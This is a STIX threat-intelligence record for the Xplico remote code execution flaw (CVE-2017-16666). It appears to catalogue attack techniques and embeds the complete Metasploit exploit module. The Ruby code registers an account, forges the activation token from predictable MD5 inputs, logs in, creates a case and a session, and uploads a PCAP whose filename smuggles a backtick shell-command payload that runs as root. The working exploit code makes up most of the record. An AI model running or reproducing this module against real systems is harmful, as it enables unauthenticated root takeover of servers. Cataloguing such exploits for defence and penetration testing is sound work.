{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7bc2e281-5cb4-4c90-a5d6-27cc2dfd0ff9",
    "created": "2024-08-14T17:01:07.032811Z",
    "modified": "2024-08-14T17:01:07.032815Z",
    "name": "Xplico Remote Code Execution",
    "description": " This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal command under the context of the root user.  The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation. But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.  One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/xplico_exec.rb",
            "external_id": "xplico_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16666"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/"
        },
        {
            "source_name": "reference",
            "url": "https://www.xplico.org/archives/1538"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Xplico Remote Code Execution',\n      'Description'    => %q{\n        This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal\n        command under the context of the root user.\n\n        The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet\n        traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create\n        a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try\n        to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.\n        But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.\n\n        One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum\n        of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>'  # author & msf module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2017-16666'],\n          ['URL', 'https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/'],\n          ['URL', 'https://www.xplico.org/archives/1538']\n        ],\n      'Privileged'      => true,\n      'Platform'        => ['unix'],\n      'Arch'            => ARCH_CMD,\n      'DefaultOptions'  =>\n        {\n          'RPORT' => 9876\n        },\n      'Payload' =>\n        {\n          'Space'       => 252,\n          'DisableNops' => true,\n          'BadChars' => \"\\x2f\\x22\",\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat gawk', # other cmd payloads can't fit within 252 space due to badchars.\n            },\n        },\n      'Targets'         => [ ['Automatic', {}] ],\n      'DisclosureDate'  => '2017-10-29',\n      'DefaultTarget'   => 0\n    ))\n\n  end\n\n  def check\n    # There is no exact way to understand validity of vulnerability without registering new user as well as trigger the command injection.\n    # which is not something we want to do for only check..!\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'register'),\n    )\n    if res && res.code == 302\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def initiate_session\n    print_status('Initiating new session on server side')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'login'),\n    )\n    if res && res.code == 200\n      res.get_cookies\n    else\n      nil\n    end\n\n  end\n\n  def register_user(username, password)\n    # First thing first, we need to get csrf token from registration form.\n    print_status('Registering a new user')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'register'),\n      'cookie' => @cookie\n    )\n\n    if res && res.code == 200\n      csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil\n      fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil\n    end\n\n    if csrf_token.nil? || fields.nil?\n      fail_with(Failure::Unknown, 'Unable to extact hidden fields from registration form.')\n    end\n\n    # rand_mail_address sometimes generates buggy email address for this app. So we manually generate email address in here.\n    email = ''\n    email << rand_text_alpha_lower(rand(10)+4)\n    email << '@'\n    email << rand_text_alpha_lower(rand(10)+4)\n    email << '.'\n    email << rand_text_alpha_lower(rand(1)+2)\n\n    # Create user\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'users', 'register'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        '_method' => 'POST',\n        'data[_Token][key]' => csrf_token,\n        'data[User][email]' => email,\n        'data[User][username]' => username,\n        'data[User][password]' => password,\n        'data[_Token][fields]' => fields,\n        'data[_Token][unlocked]' => '',\n      }\n    )\n\n    if res && res.code == 302\n      print_good('New user successfully registered')\n      print_status(\"Username: #{username}\")\n      print_status(\"Password: #{password}\")\n    else\n      fail_with(Failure::Unknown, 'Could not register new user')\n    end\n\n    # Awesome. We have user. We need to activate it manually..!\n    print_status('Calculating em_key code of the user')\n\n    unixtime = Time.parse(res.headers['Date']).to_i\n    password_md5 = Rex::Text.md5(password)\n    em_key = Rex::Text.md5(\n      \"#{email}#{password_md5}#{unixtime}\"\n    )\n    print_status(\"Activating user with em_key = #{em_key}\")\n\n    # We need to follow redirections. Even if we managed to find em_key.\n    # It will redirect us to the login form. We need to see registration completed on final page.\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'registerConfirm', em_key),\n      'cookie' => @cookie\n    )\n\n    if res && res.code == 200 && res.body.include?('Registration Completed.')\n      print_good('User successfully activated')\n    else\n      fail_with(Failure::Unknown, 'Could not activated our user. Target may not be vulnerable.')\n    end\n  end\n\n  def login(username, password)\n    # yet another csrf token gathering.\n    print_status('Authenticating with our activated new user')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'login'),\n      'cookie' => @cookie\n    )\n\n    if res && res.code == 200\n      csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil\n      fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil\n    end\n\n    if csrf_token.nil? || fields.nil?\n      fail_with(Failure::Unknown, 'Unable to extact hidden fields from login form.')\n    end\n\n    res = send_request_cgi!(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'users', 'login'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        '_method' => 'POST',\n        'data[_Token][key]' => csrf_token,\n        'data[User][username]' => username,\n        'data[User][password]' => password,\n        'data[_Token][fields]' => fields,\n        'data[_Token][unlocked]' => '',\n      }\n    )\n\n    if res && res.body.include?('<a href=\"/pols\">Cases</a>')\n      print_good('Successfully authenticated')\n    else\n      fail_with(Failure::Unknown, 'Unable to login.')\n    end\n\n  end\n\n  def create_new_case\n    # We logged in. Not we need to create a new xplico case.\n    print_status('Creating new case')\n    pol_name = rand_text_alpha_lower(rand(4)+8)\n    res = send_request_cgi!(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'pols', 'add'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        '_method' => 'POST',\n        'data[Capture][Type]' => 0,\n        'data[Pol][name]' => pol_name,\n        'data[Pol][external_ref]' => '',\n      }\n    )\n\n    if res && res.body.include?('The Case has been created')\n      res.body.scan(/<a href=\"\\/pols\\/view\\/([0-9]+)\">/).flatten[0]\n    else\n      nil\n    end\n  end\n\n  def create_new_sol(pol_id)\n    # Since we xplico case, it's time to create a \"session\" for this case.\n    print_status('Creating new xplico session for pcap')\n\n    sol_name = rand_text_alpha_lower(rand(4)+8)\n    # sols/add endpoint reads selected case id through session.\n    # So we need to hit that end-point so we can insert pol_id into the current session data.\n    send_request_cgi!(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'pols', 'view', pol_id),\n      'cookie' => @cookie,\n    )\n\n    # Creating new session.\n    res = send_request_cgi!(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'sols', 'add'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        '_method' => 'POST',\n        'data[Sol][name]' => sol_name,\n      }\n    )\n\n    if res && res.body.include?('The Session has been created')\n      res.body.scan(/<a href=\"\\/sols\\/view\\/([0-9]+)\">/).flatten[0]\n    else\n      nil\n    end\n\n  end\n\n  def upload_pcap(sol_id)\n    print_status('Uploading malformed PCAP file')\n    # We are hitting this end-point so we can access sol_id through session on server-side.\n    send_request_cgi!(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),\n      'cookie' => @cookie,\n    )\n\n    # Reading malformed pcap files.\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2017-16666', 'dump.pcap')\n    fd = ::File.open( path, 'rb')\n    pcap = fd.read(fd.stat.size)\n    fd.close\n\n    data = Rex::MIME::Message.new\n    data.add_part('POST', nil, nil, 'form-data; name=\"_method\"')\n    data.add_part(pcap, 'application/octet-stream', nil, \"form-data; name=\\\"data[Sols][File]\\\"; filename=\\\"`#{payload.encoded})`\\\"\") # Yes back-tick injection!\n\n    # Uploading PCAP file.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'sols', 'pcap'),\n      'cookie' => @cookie,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => data.to_s\n    )\n\n    if res && res.code == 302\n      print_good('PCAP successfully uploaded. Pcap parser is going to start on server side.')\n    end\n\n    # We can not wait all the day long to have session.\n    # So we are checking status of decoding process 5 times with sleep for a 1 second on each loop.\n    is_job_done = nil\n    counter = 0\n    until session_created? || !is_job_done.nil? || counter == 5\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),\n        'cookie' => @cookie,\n      )\n      if res && res.body.include?('File uploaded, wait start decoding...')\n        print_status('Parsing has started. Wait for parser to get the job done...')\n      end\n      if res && res.body.include?('DECODING')\n        print_good('We are at PCAP decoding phase. Little bit more patience...')\n      end\n      # Tbh decoding process is not going to be finished as long as we have msf session.\n      # We are not going to see this case if we are successful exploiting.\n      if res && res.body.include?('DECODING COMPLETED')\n        print_warning('PCAP parsing process has finished. Haven\\'t you got your shell ?')\n        is_job_done = 1\n        next\n      end\n      sleep(1)\n      counter += 1\n    end\n\n  end\n\n  def exploit\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, \"#{peer} - Target not vulnerable\")\n    end\n\n    # We need to access cookie from everywhere. Thus making it global variable.\n    @cookie = initiate_session\n    if @cookie.nil?\n      fail_with(Failure::Unknown, 'Unable to initiate new sessionid on server.')\n    end\n\n    # We only need to access username and password for login func. Let's leave them as a local variables.\n    password = rand_text_alpha(32)\n    username = rand_text_alpha_lower(rand(8)+8)\n    register_user(username, password)\n    login(username, password)\n\n    # We will need to have pol_id for creating new xplico session.\n    pol_id = create_new_case\n    if pol_id.nil?\n      fail_with(Failure::Unknown, 'Unable to create New Case.')\n    end\n    print_good(\"New Case successfully creted. Our pol_id = #{pol_id}\")\n\n    # Create xplico session by using pol_id\n    sol_id = create_new_sol(pol_id)\n    if sol_id.nil?\n      fail_with(Failure::Unknown, 'Unable to create New Sol.')\n    end\n    print_good(\"New Sols successfully creted. Our sol_id = #{sol_id}\")\n\n    # Uploading malformed PCAP file. We are exploiting authenticated cmd inj in here.\n    upload_pcap(sol_id)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-29",
    "x_mitre_platforms": [
        "['unix']"
    ]
}